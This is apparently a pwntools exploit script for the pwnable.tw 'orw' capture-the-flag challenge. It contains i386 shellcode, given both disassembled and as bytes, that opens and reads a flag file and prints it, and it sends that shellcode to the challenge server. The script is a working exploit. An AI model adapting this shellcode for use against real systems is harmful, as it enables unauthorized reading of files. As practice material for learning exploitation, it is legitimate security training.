#!/usr/bin/env python
# encoding: utf-8

from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = 'zsh'

'''
âžœ  orw objdump -d ./shellcode.o

./shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:	31 c9                	xor    %ecx,%ecx
   2:	51                   	push   %ecx
   3:	68 66 6c 61 67       	push   $0x67616c66
   8:	68 6f 72 77 2f       	push   $0x2f77726f
   d:	68 6f 6d 65 2f       	push   $0x2f656d6f
  12:	68 2f 2f 2f 68       	push   $0x682f2f2f
  17:	89 e3                	mov    %esp,%ebx
  19:	31 c0                	xor    %eax,%eax
  1b:	99                   	cltd
  1c:	b0 05                	mov    $0x5,%al
  1e:	cd 80                	int    $0x80
  20:	89 c7                	mov    %eax,%edi
  22:	b2 ff                	mov    $0xff,%dl

00000024 <reading>:
  24:	89 e1                	mov    %esp,%ecx
  26:	89 fb                	mov    %edi,%ebx
  28:	b0 03                	mov    $0x3,%al
  2a:	cd 80                	int    $0x80
  2c:	b3 01                	mov    $0x1,%bl
  2e:	b0 04                	mov    $0x4,%al
  30:	cd 80                	int    $0x80
  32:	fe ca                	dec    %dl
  34:	80 fa 01             	cmp    $0x1,%dl
  37:	74 02                	je     3b <exit>
  39:	eb e9                	jmp    24 <reading>

'''

def main():

    # Io = process("./orw")
    Io = remote("chall.pwnable.tw", 10001)

    shellcode = "\x31\xc9\x51\x68\x66\x6c\x61\x67\
                 \x68\x6f\x72\x77\x2f\x68\x6f\x6d\
                 \x65\x2f\x68\x2f\x2f\x2f\x68\x89\
                 \xe3\x31\xc0\x99\xb0\x05\xcd\x80\
                 \x89\xc7\xb2\xff\x89\xe1\x89\xfb\
                 \xb0\x03\xcd\x80\xb3\x01\xb0\x04\
                 \xcd\x80\xfe\xca\x80\xfa\x01\x74\
                 \x02\xeb\xe9"

    log.info("ShellCode: %r" % (shellcode))

    Io.sendline(shellcode)
    Io.interactive()
    Io.close()

if __name__ == "__main__":
    main()
